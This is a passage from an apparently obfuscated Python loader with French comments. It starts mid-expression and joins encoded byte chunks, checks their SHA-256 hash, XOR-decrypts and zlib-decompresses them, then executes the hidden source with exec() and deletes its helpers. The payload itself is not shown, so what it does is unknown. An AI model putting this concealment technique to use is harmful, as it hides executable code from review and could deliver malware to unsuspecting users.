_cxiQ08MAtmVQeS + _cdkFgwQQiXaApt + _cfUq9mObDRoM9H + _cbSalA9LVtgM_i + _ckw3SOtaDxhqWV + _crGRlK3_QG0nIF + _chheeWPkqJQ_Av + _cztSKqPS9eOBLc + _cm95z62zZzUhIL + _cvLMXOlGTfPCq_ + _cmK3BXpLuw4sac + _cwha8oQFAKJO7Q + _cpkzwVBNsa2CtT + _csYuzjuT_oPRhV + _cw0wOcvasUFym6 + _ctPsnISaPzVPU8 + _cx9CwYLLs4ENRB + _cenR_n_57TdMI1 + _cxiL1g8cyDUTOU + _cld8QUMoxHl_xF + _ce_3FscSuqZ01f + _cmPE5sC43jHttw + _cttMV_h2lEHZ_Y + _cd3oxytG018xLH + _clRGIriOXSaXAL + _cfyc1DMOlvwA9y + _ctwnaRekqmAN16 + _cxFzuZpsVrPNto + _csrCQ7jQAeR4xs + _ceOmEh6nJf7nj5 + _cqrjWafAsdCjuD + _csA5WL1LOIA5Gc + _cjXaZaBlicn_t2 + _cvOExgLz22whqf + _crW9j7BqqIXUCx + _cu1yJhpz5JxRqd + _ckw0Fqco2fXSkR + _cs5aY4r6fDJywL + _csVnDeCm1BeWvC + _cbJj5gnvHbvJAL + _cvZtNqPsKCeom_ + _c_aCENKFo3_miW + _can1Cc6GvPOxAd + _c_jhkYqy9DB8No + _cwakqzMhSgZUvJ + _cktzJjunZqtc__ + _cmRbWHvgfmzK1q + _cbvDkx3rf7BX2W + _ctssxJgpqUo7_K + _cjoB_Z8U9vWllx + _cgZP2sJ_RFL38R + _cuJwCFnN4tWdUX + _ci8gPbIlHIuSHl + _cqIQAseRIkD76A + _clt8fDWtTxB6Av + _cfWgulQd9XHwZ4 + _ckVZu4JtEVnSuR + _csbiTPOGys76nN + _csWjzpIY6gNwWy + _cqjCkF4EZMAN_u + _ceA1Oz2Ozq81Ka + _ca5Lge1qzthJ7S + _caA3nZnxPzkI1u + _cyKK1QZmPIQ23I + _cdaOc4xmuhHrZZ + _cfVfTvNjm4jL8p + _coO7Vck46xcBDn + _ch9OWyr9if6h4D + _cvnPdsE8Arr6qv + _cg0Ey__w871Pn9 + _cyLjUlogUFGlyI + _clkSqgsl08RVv7 + _cas_J9UpF8K1Fs + _cwJpR40z9jT9fo + _cv7xoss3fA16BG + _cxhWhlZsEy7hrN + _cmPXhfxmaLH0A7)
if __import__('hashlib').sha256(_pe56KVAo8LG9bY).hexdigest() != 'ac44f0b07604a5d22c21887d7e5b4739c2886a8af36a36bd49602a8024222a84':
    __import__('sys').exit(1)
_xxyXyqAPmu3krH = bytes([151, 126, 142, 221, 97, 82, 193, 125, 25, 88, 49])
_fkj8GltTMhY98De = bytes([44, 76, 55, 122, 87, 10, 89, 201, 208, 249, 20])

def _fxqknj41UIBwUrm(_bqkVlw9grkaSL6, _kyea_bYnlzJlpW):
    return bytes(_bqkVlw9grkaSL6[_iwUM6FMfFz_y4e] ^ _kyea_bYnlzJlpW[_iwUM6FMfFz_y4e % len(_kyea_bYnlzJlpW)] for _iwUM6FMfFz_y4e in range(len(_bqkVlw9grkaSL6)))

def _fdwbTo57hdylpJw(_txCMP3pcBVcEAA):
    import zlib
    return zlib.decompress(_txCMP3pcBVcEAA) # Un seul niveau de zlib ici pour simplifier

def _fer4hHDs_5MxfHw():
    import sys, builtins
    # 1. Déchiffrement XOR
    _xfTac6cd6qDoGp = _fxqknj41UIBwUrm(_pe56KVAo8LG9bY, _xxyXyqAPmu3krH)
    # 2. Décompression Zlib
    _d_mWPDhmeUksO5 = _fdwbTo57hdylpJw(_xfTac6cd6qDoGp)
    # 3. Conversion bytes -> string (C'est là la différence clé !)
    source_code = _d_mWPDhmeUksO5.decode('utf-8')
    
    # 4. Préparation de l'environnement
    _main = sys.modules['__main__']
    _ntfTG5h7DlvIri = _main.__dict__
    _ntfTG5h7DlvIri.setdefault('__builtins__', builtins)
    
    # 5. Exécution directe du code source
    # On compile à la volée, ce qui marche sur n'importe quelle version de Python
    try:
        exec(source_code, _ntfTG5h7DlvIri)
    except Exception as e:
        print(f"Erreur fatale: {e}")
        sys.exit(1)

_fer4hHDs_5MxfHw()
try:
    del _fxqknj41UIBwUrm, _fdwbTo57hdylpJw, _fer4hHDs_5MxfHw
    del _pe56KVAo8LG9bY, _xxyXyqAPmu3krH, _fkj8GltTMhY98De
except:
    pass
